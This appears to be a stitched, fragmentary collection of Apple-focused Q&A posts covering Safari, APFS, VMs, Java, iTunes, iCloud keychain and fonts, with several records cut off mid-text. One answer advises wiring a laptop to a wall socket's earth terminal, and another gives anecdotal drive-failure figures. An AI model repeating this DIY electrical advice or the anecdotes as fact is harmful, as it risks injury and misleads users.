You could try 'reviewer roulette' and see if you submit under another dev account that another reviewer will approve it. That's unlikely based on how the App Store has been cracking-down on apps such as yours (that are very similar to other apps).\nMy recommendation is not to do this.

He now has a MacBook Pro (new, running macOS 10.13 High Sierra), and I was tasked with trying to find a way to move those sites he saved back into bookmarks.\nThis answer didn't help at all, but I think my question was the same:\nExport iPad home screen bookmarks/Safari bookmarks to PC/Mac\nCan I transfer these sites to bookmarks, or is all hope lost?\n\nA: Follow these steps:\n\n\n*\n\n*Tap on icon on Home screen of iPad to open in Safari.\n\n*Once the website is open in Safari, tap on the share icon and add the website as bookmark in Safari.\n\n*Repeat for all the website icons on Home screen one by one.\n\n*Go to Settings app → iCloud and turn on switch for Safari.\n\n*On your Mac, turn on iCloud sync for Safari.\n\n*The bookmarks should show up in Safari on Mac.\n", "Q: macOS as a guest and in the host I want to install macOS High Sierra as a guest having macOS in the host but want to know what virtualization software either VirtualBox of VMware provides the best security options between Guest and Host.\nFor example, I would like to create multiple VM's with their own disk encrypted (filevault) boot/firmware password or any other Guest mechanism in place in a way that when the VM is down, the host could only delete the VM but in no other way could see contents of the disk besides probably brute forcing it from the host console.\nThe access to the guest VM may be via VNC/remote desktop/ssh but they are on a shared environment (rack with multiple mac minis) in where some extra security is required at least when VM's are down since once UP could be very easy from the HOST attach to the console. \n\nA: This would be trivial with either suggested VM software. \nMake an encrypted sparse disk image large enough to hold the guest storage and then build your VM once you’ve mounted the secure disk image. \nBy controlling the encryption passphrase of that store, other admins can only delete the container, not mount and read it. \n\nA: I agree with @bmike 's answer, and was going to comment above, but I don't have enough reputation points.\nMy setup is:\n\n\n*\n\n*APFS file system on host.\n\n*Encrypted .sparsebundle image for each guest VM.\n\n*TimeMachine (and/or Arq or other backup mechanism) configured to backup only the unmounted sparse bundle.\n\n\nYou want sparse bundles because they actually consist of small 8MB bands of data, rather than a huge single file for the entire disk image. This means that the backup will take a lot less, as only the modified bands will be backed up, rather than backing up the entire disk image every time the backup is run.\nYou want APFS because that gives you the ability to quickly create snapshots and just even clones, w/o taking up any additional disk space (until things start changing).\nYou want to avoid backing up the mounted sparse bundles, otherwise you will loose the whole above discussed advantage of having the VM split in tiny encrypted bands. \n", "Q: MacBook Pro Connects to Wi-Fi but not the Internet I am on a MacBook Pro 2012 running macOS 10.11. \nRecently, I have been having a problem with my Wi-Fi. Specifically, whenever I disconnect from one Wi-Fi network and attempt to connect to another in a different location, I get no internet. The signal says I am fully connected to the new network, but I cannot access the internet.\nRestarting the computer solves the problem, but it is a pain to restart the computer every time I want to connect to a different network as I travel with my computer a lot.\nI recently installed VPN software and suspect this may be the root of the problem because I never had this problem before the VPN.\nCan anyone give me some ideas to fix this?  \n\nA: Seamus is right, it seems an issue related to network and not your MacBook Pro, though, you could execute  network diagnostic Utility.\nThe Network Diagnostics utility will guide you through a series of questions and tests, based on  your ethernet or Wi-Fi connection to network configuration and DNS servers. Sometimes the utility is able to fix issues by itself , but,when it can’t, it usually provides lots of useful info regarding  the nature of the problem as well as to offer several suggestions in order to fix network issues.\nregarding VPN, could you tell me if you use more IP at the same time ? \n\nA: This is a network issue, not a Mac issue. If you have two Access Points (APs) rather than two different WiFi networks, you may be able to do this, but the APs must be configured properly. If they're two different WiFi networks, I'd rate your chances somewhere between slim and none.  \n", "Q: Can't extend APFS after erasing old partition as free space My problem is very similar to this one:\nExtend main APFS partition fails with \"target disk is too small for this operation\"\nI erased an unused 80 GB partition as free space, and I would like to extend my APFS container to fill up all the free space.\nI tried to resize the container but I get the error The target disk is too small for this operation\nI booted into recovery mode and did a diskutil list:\n[200~-bash-3.2# diskutil list\n/dev/disk0 (disk image):\n   #:                       TYPE NAME                    SIZE       IDENTIFIER\n   0:      GUID_partition_scheme                        +2.1 GB     disk0\n   1:                  Apple_HFS OS X Base System        2.0 GB     disk0s1\n\n/dev/disk1 (internal):\n   #:                       TYPE NAME                    SIZE       IDENTIFIER\n   0:      GUID_partition_scheme                         251.0 GB   disk1\n   1:                        EFI EFI                     314.6 MB   disk1s1\n   2:                 Apple_APFS Container disk2         168.7 GB   disk1s2\n   3:                        EFI U                       500.2 MB   disk1s3\n   4:                 Apple_Boot Boot OS X               134.2 MB   disk1s4\n\n/dev/disk2 (synthesized):\n   #:                       TYPE NAME                    SIZE       IDENTIFIER\n   0:      APFS Container Scheme -

The instructions for same are outlined by the developer in this blog post.\nAs outlined in the blog post, you can record both a FaceTime audio as well as a regular phone call. However, make sure about the legality of the act. You may be required to inform the other party about the recording.\nNo affiliation whatsoever with the developer, they are very well known for the quality software they make.\n\nA: In the upcoming macOS 10.14 Mojave (in public beta right now), the voice recording app comes to mac.\nIn theory you could use this to record a FaceTime audio call on your iPhone X.

Before anyone asks, yes, one software DOES need Java (LibreOffice). \nProblem is, the install window abruptly closes, and the installed version stays at 8u171, according to the Java preference pane.\nIn a terminal windows, I found things even more confusing:\n\n$ java -version java version \"1.8.0_161\" Java(TM) SE Runtime\n  Environment (build 1.8.0_161-b12) Java HotSpot(TM) 64-Bit Server VM\n  (build 25.161-b12, mixed mode)\n\nI don't know exactly what is happening. Console doesn't say why it's failing.\nI already tried to manually install 8u181 from the .dmg found on Oracle's website, but the result is the same.\nSame goes when I try to install the update in Safe Mode.\nAny clues?\n\nA: Solved. Basically, I forgot that I had to install not the JRE, but the JDK as a workaround for some LibreOffice bug. The JDK does not allow updating through the Java preference pane.\nAs soon as I manually updated the JDK, the Java preference panel said I had the correct, 8u181 update.\n", "Q: Macbook trackbar gives me electric shocks I have perused the entire web to see if anyone has had a similar problem with his/her MB but it seems this is an extremely isolated case that myself alone is experiencing. I bought a refurbished 2015 MacBook pro (straight from an online Apple store) in July 2016. On the day it was delivered, it got a kernel panic. I immediately thought it would be a good idea to return the computer but I was too busy and needed a computer so bad and most importantly, I bought the computer in Japan and the language barriers helped a little in making the regrettable decision of not returning the computer. Over the past two years of using the computer, I have noticed a few minor glitches that I mostly decided to ignore. This include for example:\n\n\n*\n\n*Occasional kernel panic when I am compiling large projects\nKernel attacks when I open many chrome tabs\n\n*Sound distortion when I listen to music on my Windows 10 Bootcamp partition. If this happens, and if I do not turn off the computer, I eventually get a blue screen of death on windows\n\n*Many other glitches (Persistent beachball, slowness, unresponsive app, etc..) that I, unfortunately, ignored until my AppleCare plan expires.\n\n\nThe above glitches are nothing compared to what I have been experiencing recently, however. My MacBook's trackbar is giving me electric shocks! Yeah! At first, I thought that maybe my fingers were tired and that I needed to take a break. But this has continued ever since. The electric shocks themselves are not too serious (and sporadic). However, after some time of usage, I feel the burn it gives me and it quickly accumulates over time. It's so strange and hard to explain. I tried to explain this to an apple shop employee but they, unfortunately, could not help because I either could not explain the problem well enough (language barrier) or, as I suspect, because they have never heard of the problem and that the electric shock burns are only felt after a period of use (something like 30 minutes to an hour), thus, did not have enough time to actually test it themselves. Facing this challenge, I turn to the community to ask what are my options to have this problem solved: \n\n\n*\n\n*Has anyone ever experienced a similar problem? \n\n*Is my MB turning slowly into an explosive Galaxy Note 7? \n\n*Is there any way I can contact Apple (English support and without requiring AppleCare plan) to help me solve this problem? Or, should I conclude that I am just screwed and, as my friends often joke, switch to a Dell XPS 13? \n\n*And most importantly, what is the likelihood that this thing will one day decide to go ballistic and blast like a Galaxy Note 7?\n\n\nA: I just got my MacBook Pro 2 months ago. When I charge my Macbook, the top surface next to the mouse pad feels like it is vibrating and the edges give me a sudden shock.\nThis is what I did next: I attached a wire that is connected to the Earth terminal in the electrical wall socket and the other end to the Macbook Pro corner and viola, the vibration and shock disappeared. \nThe electric adaptor that converts AC 220V to 20/9 V DC into the USB Type C connector does not appear to be connected to the Earth terminal as you see below.\n\n\n\nA: \nHas anyone ever experienced a similar problem?\n\nHave I? No.\n\nIs my MB turning slowly into an explosive Galaxy Note 7?\n\nNo.\n\nIs there any way I can contact Apple (English support and without\n  requiring AppleCare plan) to help me solve this problem? \n\nAlthough Apple insinuates that you need AppleCare for tech support this is untrue. Contact support and explain your issue. They will be more than happy to help.\n\nOr, should I\n  conclude that I am just screwed and, as my friends often joke, switch\n  to a Dell XPS 13?\n\nApple should be able to help you with your issues. \n\nAnd most importantly, what is the likelihood that this thing will one\n  day decide to go ballistic and blast open my nuts?\n\nVery unlikely. I would also not suggest eating nuts near your computer ;)\n", "Q: How can a Mac split a single backup to two independent, external drives I have been asked to perform an emergency backup of a device showing signs of HDD failure. I'm being provided with two individual external hard drives to accomplish this. Each drive is independently too small for the job, but together their space is sufficient. I can format them however I want and do anything I want with them.\nCan Time Machine perform a single backup that is split across two devices, simply writing to one device until it runs out of space and then writing to the second? If not, can I create a RAID 0 array out of two independent external drives? What would recovery look like if I had to restore such a backup from scratch to a new HDD?\n\nA: Time Machine can't partially backup to one drive, then when space runs out, continue to the next drive.  \nBut you can concatenate several drives to look as one and then use Time Machine. \nAs you have said, you can create a RAID drive. This should work with Time Machine. Recovery would look normal. (See here). You can restore from Recovery, Migration Assistant, etc.)  Time Machine would detect it as a RAID drive and will mount it as one drive instead of two.\nWhen restoring the entire of the drive I would always suggest booting to Recovery instead of migration assistant.\nJust remember, using RAID always significantly increases chances of corruption or failure. RAID 0 is the worst because there are no failsafes: If one drive fails, corrupts, or dies they are both useless. \nYour best bet would to purchase a single big enough drive to do the job. \nRemember it always better to do it right, especially when it comes to peoples data.\n\nIf you are looking to purchase a drive, I would go with LaCie, and definitely not Seagate. 4/5 Seagate drives have failed without being moved within 6 months.  None of my LaCie drives have failed.\nNote: I am not affiliated with Seagate or LaCie and will not gain in anyway (financially or otherwise) from the purchasing of their products.  Additionally, the suggestions above are form personal experience and do not in any way reflect proven published statistics.\n", "Q: Safari: Can I tab through smart search field options? In Firefox, I can start typing in the search bar and it will bring up options from my history, bookmarks, etc., and I can tab through those options. \nSafari's smart search field does something similar. I can type a keyword and see in the list of options it presents me an item I want, but I cannot seem to tab through the options it presents me. When I press tab, it shifts focus off of the search field on to something else. What I can do is  take my hands off the home row, look down at the keyboard, find the arrow keys, and arrow through the options, but this is tedious. This might come across as picky, but despite wanting to try it, this is a non-starter for me for Safari. Is there a way to tab through (or navigate through in some other way) Safari's smart search field options?\nThanks!\n\nA: As a Tab alternative, you can use ctrl-N (next) and ctrl-P (previous) to move through the smart search field options without having to look down or remove your hands from the home row.\n", "Q: How to transition from macOS Server deprecated services to the open source alternatives? According to Apple's recent statement, many of the current feature of macOS will be removed in future versions of macOS Server.\nApple offers alternative software and programs to use instead of the services in macOS Server.  I would like to transition to these new services but am unsure how to go about doing this so I get the identical (or as close as possible) configuration as I have currently, with macOS Server.\n\nA: In June 2018, Apple released official documentation outlining the step by step directions to move most services to alternatives.\nThe services included in this are\n\n*\n\n*DNS\n\n*DHCP\n\n*VPN\n\n*RADIUS\n\n*NetInstall\n\n*Websites\n\n*Wiki\n\n*Calendar and Contacts\n\n*FTP\n\n*Software Update\n\n\nThe goal of each section is to have\n\nThe identical configuration as the macOS Server [service name] service.\n\nNote: Some services are unable to be replicated completely\n\nMajor elements of the macOS Server Wiki structure, user model, and semantics—that is, separate wikis with separate ACLs, pages and files associated with specific wikis, user pages and blogs, page histories, directory- based users and groups, themes, avatars, custom banners won’t fully map to any current open source project.\nAPNs requires special Transport Layer Security (TLS) certificates in order for the server to authenticate to the Apple-hosted service. Those certificates are generated by macOS Server. There is currently no alternative means of generating the required APNs certificates, so push notifications can’t be used when macOS Server is no longer available.\n\n", "Q: Force sync Photos to iCloud on macOS I have recently been on holiday and saved all my photos on my mac whilst I was away.

I would like to seperate work and home use.\nI was wondering if I could backup the current installation, wipe and partition the drive into two, and restore the original macOS installation into both the partitions, effectively using the licence twice on my Mac.\nIs this even possible and allowed?\n\nA: It is easily possible to partition the drive and perform two (or even more) separate installations of macOS to keep home and work use separate.\nNo license violations whatsoever are involved in this act.\nHowever, this approach is generally taken, only when you wish to run two or more different versions of macOS on a single machine at the same time. (For e.g. to run or develop an app on different major versions of macOS).\nIn your scenario, a highly recommended approach would be to create two separate user accounts instead of performing two different installations of the exact same operating system.\nThe following is a discussion listing drawbacks of the original approach (which could be entirely avoided by taking the aforementioned recommended approach):\n\n\n*\n\n*Wasted disk space: Partitioning and installing two copies of the same operating system will unnecessarily end up eating precious hard disk space. Almost all the operating system and app installation data would be duplicated and twice the amount of storage will be used.\n\n*Management cost: You will have to separately update and manage two copies of the same operating system and installed apps. This is a repetitive and time-consuming process.\n\n*Context switching: To switch context between work and home profile will require you to perform a full restart. You'll have to close the open apps and files in one profile even if you want to switch to the other profile momentarily for a small task. With 2 user accounts, the context switch is very easy, quick and won't require you to quit any running apps or close any files.\n\n*3rd party software license: Some 3rd party software license may not allow such multi-user use and may require purchasing a separate license. While in the recommended case, only a single copy of the app can be installed and shared between the two accounts. (this can again vary from app to app depending on how it is licensed, but you'll be better off in most cases.)\n\n*Difficulty in sharing data: It may be difficult to share user data (if required) across profiles, especially if you opt to encrypt the contents of the drive. However, with the recommended approach, you can have a shared folder and seamlessly share data between the two accounts.\n\n*Limit of scalability: If a similar need for further segregation arises in future, the process will be really cumbersome involving taking backups, creating multiple partitions, installing more copies of the OS and apps and restoring data, which could soon go out of hand. On the other hand, with the recommended approach, you can simply add/delete a new user account within a few seconds.\nAll the above hassles can be avoided simply by creating two separate user accounts one each for work and home use. The data is kept segregated along with any OS and app level configurations. Any app will need to be installed only once and will be automatically available in other user accounts (any app-specific data and configuration will be kept segregated). You will also have the option of keeping an app private to a user by installing in ~/Applications directory instead of /Applications directory.\nYou can choose to make all the user accounts as Administrators and they will have access to all the system level settings. Each account can even be configured with a separate Apple ID. Each account can in effect act as a standalone macOS installation, remaining ignorant of the existence of the other user.\nThis setup can accomplish your desired goal in a highly manageable and scalable manner.\n\nIf you have other concerns and priorities where the aforementioned limitations don't apply, it is perfectly fine and easy to partition your hard drive into 2 (or more) partitions and have more than one simultaneous installations of macOS.\n", "Q: Xcode environment not dark in Mojave beta's dark mode I feel really stupid for asking this, but here goes:\nIs there a button or setting somewhere to make Xcode use dark mode for its environment in the Mojave Beta?\nSearching for this renders a lot of questions about dark mode in High Sierra, or how to make your programs adjust to dark mode, but what I want is for Xcode itself to use dark mode, which just doesn't happen on my 2015 MBP with Mojave Beta.

TextEdit won't add backslashes to the text.\nYou can still use Terminal, though. If you type echo, then drag and drop into Terminal, and then hit enter, the backslashes will be removed (actually, they're there precisely to allow terminal commands to handle the raw input -- echo doesn't see backslashes, but a single argument containing space characters).\n$ echo pCloud\\ Drive/SEN\\ pCloud/SEN\\ Tech\\ Team/Clean\\ Energy\\ WA\\ Study\\2016/For\\ checking/AB\\ checks/SEN\\ RE\\ SWIS\\ 2030\\ notes\\ for\\ AB\\checks\\ -\\ Backup\\ input\\ table\\ tab\\ \\(5.1.16\\).docx\npCloud Drive/SEN pCloud/SEN Tech Team/Clean Energy WA Study2016/For checking/AB checks/SEN RE SWIS 2030 notes for ABchecks - Backup input table tab (5.1.16).docx\n\nFurthermore, you can automate the copying of the text by piping to pbcopy:\n$ echo pCloud\\ Drive/SEN\\ pCloud/SEN\\ Tech\\ Team/Clean\\ Energy\\ WA\\ Study\\2016/For\\ checking/AB\\ checks/SEN\\ RE\\ SWIS\\ 2030\\ notes\\ for\\ AB\\checks\\ -\\ Backup\\ input\\ table\\ tab\\ \\(5.1.16\\).docx | pbcopy\n\nNow the desired text will be on your clipboard.\n", "Q: Compiling Swift 2 code I have an app which is written in Swift 2.1.

There is no outward indication that this takes place. After Windows 10 finishing installing, software including additional drivers are installed. This process is very evident due to output shown on the display.\nWhen watching the video, I did not see any step where the Apple supplied drivers, required to boot Windows 10, were installed to the drivers store. This means the instructions supplied in this video are incomplete.\nSo you may ask: Why did the example shown the video work? My best guess would be that Windows 10 was installed on an older Mac. Microsoft makes an  effort to include in the ISO all the drivers needed to boot an installation of Windows 10 for any Windows 10 compatible computer. For an older Mac, there would be no needed to copy the Apple supplied drivers to drive store, because the required files would already be in the store. \nSince your Mac is a 2018 model, the drivers needed to boot may not have been included yet in any Windows 10 ISO file. If this is the case, Windows 10 will not be able to boot.\nMy best advice would be to not try to use third party software in an effort to trick Windows 10 into booting from an external drive. All the software needed to install to an external drive is already included in the Window 10 ISO file.\nIf you want to proceed based on the video, then eliminate the use of the VMWare Fusion software. In other words, use Boot Camp to install Windows 10 to your internal drive, then use WinToUSB to transfer to the external drive. You then can remove Windows 10 from the internal drive.\n", "Q: What is normal for startup chime till Apple logo shows?

Here's a photo of my keyboard :\n\n\nA: Only Belgian and French Apple layouts are AZERTY.  If you have either the French or Belgian input source active, they will give you @# above Tab.  But <> will be next to the left shift before W.  Your picture indicates this latter key is missing, so it is not a proper French/Belgian keyboard, but some kind of mishmash, with keys from an ISO keyboard grafted onto an ANSI keyboard.\nThe only keyboard with <> near Delete is Turkish, which is different everywhere else, and also has the extra key, \nTo get output to match your keys you will need a custom layout made with Ukelele or Karabiner.\nHere is one I made with Ukelele which may work.  You put the French Mod.keylayout file in Library/Keyboard Layouts and then go to system preferences/keyboard/input sources and use the plus and add buttons to activate (it will be in the Others category).\n\nA: The most likely explanation is that the offending keys were manually swapped.

Is it possible to implement such stuff in the terminal interface? Preferably, I would not download a terminal emulator like iTerm etc..\n\nA: There are ways to navigate in the terminal but they don't use the macOS keystrokes for navigation as the BASH shell actually predate macOS/NeXT. For example CtrlA moves to the beginning of a line and CtrlE moves the cursor to the end of a line. A quick search online on BASH shell keyboard shortcuts will yield a whole list like this, for example.\nAs an alternative BBEdit is a text editor that has been around on the Mac for ever. Way Pre-OS X. And one of the features is a command line window that acts much like a text editor and uses the standard Mac keybindings. But then you'll have to buy a programmers text editor to get the features you want in a shell window.\nMight be best if you just learn the BASH keybindings, as that is lots cheaper ;-)\n\nA: Apple has the complete (AFAIK) set of Terminal Keyboard shortcuts on their support website.

I have an old version of Photoshop that requires an outdated Java runtime.\n\n\"More info\" takes me to this Apple support page where you can download the older JRE.\nSeems reasonable enough, but I am slightly concerned.\nMy question:\nCould installing this deprecated, unsupported JRE make my system more vulnerable to malware?\nAdditional details:\n\n\n*\n\n*I'm running macOS 10.13.6 (17G65) High Sierra.\n\n*As far as I'm aware, I'm only using Java to (prospectively) run Photoshop.\n\n*I never install Java extensions for browsers, so this question only has to do with desktop applications.\n\n*Under \"Security & Privacy\" I've selected \"Only allow apps from the App Store and identified developers\".\n\nA: I don’t consider java a safe tool to install period. Unless you have a very compelling reason, or some specific threat model, don’t install java if you want security in your Mac.  It’s worse to install older versions that don’t get current security patches in general.  \nI’d look at something like Pixelmator or Acorn or even a newer Photoshop since your photoshop won’t get security patches anymore either.\nhttps://www.engadget.com/2013/05/14/pixelmator-and-acorn-economic-practical-image-editors/\nYour mitigation steps in additional details are all solid and well reasoned and each reduces your risk to security. so I can’t say the risk wouldn’t be worth it to you once you evaluate the alternatives I’ve mentioned. \nI can say, I’d choose to not use photoshop CS 5.1 and java in my case. \n", "Q: Text editor to search/replace newlines and tabs A time-saving feature I often used while editing large text files (the kind used for batch processes of data exchanges, aka, \"flat files\" for feeds  between multiple systems) was Notepad++'s extended Find/Change function where you can specify certain characters (such as tab, space, line feed, carriage return) in both the Find function and the Change function. \nThis is the detail on how it works: \n\nOpen the find/replace dialog. At the bottom will be some Search mode\n  options.  Select \"Extended (\\n \\r \\t \\0 \\x...)\" In either the Find\n  what or the Replace with field entries, you can use the following\n  escapes:\n  \n  \n*\n  \n*\\n   new line (LF)\n  \n*\\r   carriage return (CR)\n  \n*\\s   space character\n  \n*\\t   tab character\n  \n\nThis would make it very easy to edit lists of information, changing files from comma to tab delimited, or files with spaces between into comma delimited, as well being easy to go from spaces to tabs (or visa versa). \nAnyone happen to know which text editors running on Mac OS have this feature (or have plugins to add this functionality)?\n\nA: Text Edit which is available out of the box supports searching for special characters:\n\n\n*\n\n*Access \"find\" functionality with Cmd-F\n\n*Click the small magnifying glass at the beginning of the entry field and select \"Insert Pattern\" (last entry)\n\n*Pick your pattern (and repeat if necessary)\n\n\n\n\n\n*\n\n*Move the cursor to the replacement field to select a pattern there (or just copy/paste from the search field)\n\n\n\nIf you do a lot of text-based file processing it might help to spend some time to learn about basic Unix tools like awk, sed and friends. This would make thinks a lot easier on the long run.\n\nA: I was using TextEdit on a Mac, and nohillside's solution didn't work for me because I needed to replace with a tab, not search for a tab. What worked for me was hitting option + tab in the \"replace\" field.\n", "Q: bsdtar gives (Empty error message) when trying to extract an ISO On High Sierra 10.13.6 (17G65), trying to bsdtar -xf something.iso fails with:\nbsdtar: (Empty error message)\nbsdtar: Error exit delayed from previous errors.\n\nI have plenty of disk space left and know that the ISO indeed works.

I purchase an App (Master Record) it is very low quality (recording always clipped, cannot control input level or find any help)\nI would like to cancel my purchase?\nIs it possible? how?\nNOTE: there is not demo/trial mode for this app\n\nA: Purchases are considered final.\nHowever, the same has happened to me and I’ve found Apple to be quite forgiving if you explain the situation and ask nicely.\nContact iTunes Support and see if they will refund or credit you. Go to https://reportaproblem.apple.com in your browser, log in, locate the purchase and explain the situation. \nGood luck!\n", "Q: iPhone 7 - Can't update apps When I try to update an app, it says Verification Required, and when I try to fill in my PayPal account, it declines due to an issue with my PayPal account, and I think the same problem applies to credit and debit cards (I don't have a credit or debit card).\nI tried reading many tutorials, and people who had the same issue as me, and none seemed to have fixed my issue. (I can't choose None when I try to edit my Apple ID payment information, and I don't own a iTunes gift card or a Mac.) I am clueless, and confused. I really need some help.\n\nA: If you can‘t select „None“ you must enter some payment details to re-enable your account. So either get your PayPal account fixed, create a new PayPal account, or get a credit card (or ask Antriebs to help you out with one). \nIf all these options are unavailable to you right now you can try tinsort it out with Apple Support. Contact details depend by country etc but can be found at the bottom of apple,com. \n\nA: There is a pending charge from iTunes on your account. This may be a monthly subscription (iCloud storage, Apple Music, etc) or an app, movie, song, book, something purchased from the iTunes or App Store(s). Whatever card information was on file at the time of this purchase is the card information that the Verification Required is looking for.\nTo reiterate, if you had credit card information on file but no longer have access to that card, you are in a bit of a pickle because entering other bank information or even an iTunes gift card to relieve that pending charge does NOT work, in my experience. I hope this helps.\nNote: if the charge is a pending subscription, there should be an email from Apple with \"Update payment information to [continue service]\" in the subject line.\n", "Q: iTunes attempts to mount SMB share using old SMB server name mac OS High Sierra 10.13.6 (17G65) and iTunes 12.8.0.150\nI have a bunch of MP3 files on my SMB share (a Linux home server). The SMB server used to be named \"sega-SMB\" and I renamed it to just \"sega\".\nThe problem with iTunes is that if I don't connect to the \"sega\" SMB server and mount the share (its name never changed) in Finder before attempting to start playing any song that is on this \"sega\" SMB server, iTunes attempts to connect to the old \"sega-SMB\" name. It errors out saying that it can't connect to the server. It is not lying. The \"sega-SMB\" server is not on the network anymore. There's only \"sega\" now.\nSo, iTunes somehow cached the old SMB server name. If I first connect to the SMB server and mount the share via Finder and then try to play a song in iTunes, it has no problem figuring out the path to an MP3 file. \nBasically, if I just logged in and started iTunes and want to play music it attempts to connect to my SMB server using old name that is no longer valid. If I connect via Finder and mount the share, iTunes has no problem playing the music.\nI was wondering if there's a way to delete this cached record somehow, somewhere. I've been searching for a solution on Google but haven't been able to find anything yet.\nI tried clearing all recent connections in \"Connect to Server\" dialog. I also tried deleting obsolete keychain entries. None of that helped.\n\nA: iTunes is bloated and willful (my opinion), but here's a counter-point to that. I'm posting this as an \"answer\" in the fervent hope that someone will downvote it, tell me how stupid I am, and reveal (at long last) the \"true\" answer to the question, \"Why does iTunes persist in looking for my media in the wrong place?\". That said, here's all that can be done: \n\n\n*\n\n*Start iTunes, select iTunes, Preferences..., then the Advanced tab.  \n\n*Click the Change button, and in the dialog navigate to the location of your media.\n\n*Note that there are other options in the Advanced tab that will give iTunes greater autonomy over your file system than it already has. I've found them to be recipes for chaos, disaster and confusion, so I don't check them see this screenshot.\n\n\nFinally, prepare to repeat this process frequently as long as you use iTunes. Frankly, the only reason I still use it at all is to a) store music on my phone, b) provide my playlists to Sonos. Again - hoping someone will strike me down, and we'll both be illuminated for it :)\n\nA: The SMB server name is \"cached\" (e.g. saved) in the Keychain. You can use the Keychain Access app to edit/delete saved server connection credentials.\n", "Q: Upgrading from OS X El Capitan to macOS High Sierra I'm in the process of planning an upgrade from OS X El Capitan to macOS High Sierra, and I'm using things like Homebrew, Composer, Elasticsearch, and — by extension — Java.\nI'm using MAMP Pro with the files stored in: /Library/WebServer/Documents/.\nI need to know if these things will remain intact after the upgrade, or whether I have to install them again afterwards?\n\nA: All the software installed in macOS (along with the ones you mentioned) remain intact between OS upgrades.\nHowever, it is advisable to keep an up-to-date backup before performing the upgrade.\n", "Q: Change password for iCloud keychain / prevent it from being unlocked with computer password I use iCloud Keychain across iOS devices and my MacBook Pro. I recently discovered that on my Mac I can access the passwords stored in the iCloud keychain simply with my (admin) login credentials. Is there a way to give the iCloud Keychain a specific password? \nI would like to prevent the iCloud Keychain from being unlockable with my computer login (password and Touch ID) and, ideally, on my iOS devices also with my online Apple ID. \nAlternatively, if the above is not possible, can I use a different Keychain for syncing?  I know, on the Mac I can create personal Keychains that have their own unique passwords. Is there a way to sync these Keychains across devices? So far I was unable to get them to show up on my iPhone. \nThank you very much!\nEDIT:\nFollowing suggestions from bmike's answer below who refers to this question, there are possibilities how to specifically change either the login password (using passwd) or the password of a specific keychain (using security ... – follow the link for further information).  However, what I am trying to do is to change the iCloud keychain password. \nThe iCloud keychain shows up as a separate keychain in the sidebar of Keychain Access, but it doesn't seem to be stored in any accessible place (i.e., in a .keychain-db file) the password of which could be changed via the methods suggested. \nIf I get the info from any item in the iCloud keychain I can simply show the password by entering my login password.  It asks me for the \"Local Items\" keychain, which seems to be the same like my login keychain (at least it obeys the login password).  \nEven when I try to specify \"Access Control\" for an item, I'm not allowed. In regular items, I can click \"Ask for Keychain password\" under the \"Access Control\" tab. But in the items under iCloud Keychain it displays \"Access for this item cannot be edited\" there.\nAny further help is much appreciated!\n\nA: I’m afraid the cloud keychain is the only one you can not lock your account out of so you'll likely fail to do what you ask. \nAll other keychains are trivial to choose an different password - even the log in keychain is easy since you can change your log in password with the passwd command line tool. Then, each time you log in to your Mac - the keychain password will be what it was before you changed the log in password and have to enter the second password.\nMost people hate that situation, but you could run that way intentionally if that suits you.\nThe iCloud Keychain is tied to secure tokens so that you can have different passwords on different devices and I believe it uses your iCloud password to generate the unlock tokens. If so, you’ll have to disable iCloud Keychain syncing in all likelihood to lock / change it via passwords. \n", "Q: Sync files between two different folders on a single Mac I am looking for a solution to sync files within different folders on a single Mac.\nThe files are tracked under Git version control system, so I can't use aliases.\n\nA: Since the files are under Git version control, you can simply add the second folder as a remote repository.\nOnce done, you can sync the files between the two by performing Git Pull and Push operations.\nHowever, the only drawback is that the sync will have to be performed manually.\n\nA: If the git solution does not work for you Linux has you covered. \nFor folder syncing use rsync -avP —delete —exclude=‘excludeDir’ /path/source /path/dest\nor \nmirror\nAnd for automatic operation use the scheduler crontab\n", "Q: Does Apple have administrative control over Developer program enrollment? I have tried for 2 weeks to complete enrollment in the Apple Developer Enterprise Program (US$ 299), but halfway through each attempt (10-12 by last count) the application switches from Enterprise to Developer (US$ 99).\nIs there any administrative override for this program? I have re-applied 15-20 times by now.\n\nA: Yes - Apple has very good administrative control and you deal with the sales organization (online web store) when you are purchasing any developer account. They aren’t going to know the in-and-out of why you were rejected a bunch of times but they are showing you clearly the way forward.\n\n\n*\n\n*Pay the $99\n\n*Get your account going now\n\n*Upload your first two or three apps to TestFlight and get your testing going with hundreds of internal beta testers. \n\n\nThen engage the developer support team for free once they can see the sort of work you’re doing and when you have a specific need the basic account can’t meet. Now you’re a known partner they can work with - now you’re the guy keeping on banging on the sales door that was closed again and again. True enterprises are easy to verify and when Apple isn’t sure you are an enterprise, their job is to say no and reject the application so don’t get mad at the process or the people - just level up your goals and build your app now and work with developer support down the road - once they see your need, they will be your advocate so sales arrange an upgrade and/or pro-rated refund if you really need to get to enterprise features before the first year expires.\nhttps://developer.apple.com/programs/enterprise/enroll/\nSince the test flight restrictions are so lenient now, you won’t need enterprise to distribute apps to hundreds of employees with the $99 program.\nThe enterprise account is really for people that start with a normal developer account and need added functionality.

Apple's new system font, \"San Francisco\", has two versions - \"Compact\", for display on small screens like the Apple Watch, and a regular version for display on larger screens like macOS devices.\nI am looking to replace the system font on my Mac from SF Regular to SF Compact. This is the procedure I'm using:\nhttps://www.macissues.com/2014/11/21/how-to-change-the-default-system-font-in-mac-os-x/\nPreviously, the macOS font files in the /System/Library/Fonts folder included separate .ttf files for each font weight (bold, light, regular, etc.) On High Sierra, however, there is only one .ttf file containing a single font weight (regular).\nThe file is located here: /System/Library/Fonts/SFNSText.ttf. Using Fontforge, I replaced the alphanumeric glyphs of this font with those from the SF Compact file /System/Library/Fonts/SFCompactText-Regular.otf.\nAfter restart, the following happens:\n\nAny interface text that would normally be bold now fails to render.\nFor reference, with stock system font:\n\nSo, my question is: How does macOS display generate bold type instances of the system font?\nWhat's interesting to note is that even when I only modify certain characters (\"C\", \"r\", \"m\"), the entire bold string (\"Chrome\") fails to render. This leads me to believe that the individual glyphs are not the issue, rather, something is being changed during Fontforge export. Fontforge does have a feature which allows for \"Multiple Masters\" - different weights and widths of a font contained in the same TTF file, but the original Apple-provided SF font (SFNSText.ttf) does not include any \"Multiple Masters\".\nAny help would be greatly appreciated!\nEdit: I am aware that there are also Display and Text variants of both fonts (SF and SF Compact). The menu bar uses the Text variant, so I am focusing on that one.\n\nA: If you go to Apple Fonts you can download the SF Pro or SF Compact Fonts. When I download and open the SF Pro I got 30 .otf files for Text and Display fonts. I installed these using Font Book. This installed SF Text and SF Display. SF Text contains 16 variations ranging from Regular to Bold and including Semi-Bold, Heavy Italics, and Text Light among others.\n", "Q: How to open a URL with Terminal through applescript by using mpg123? I need to use mac terminal to open an audio stream from a URL through an applescript. I know that mac terminal is already equipped with afplay, but that only plays a file which 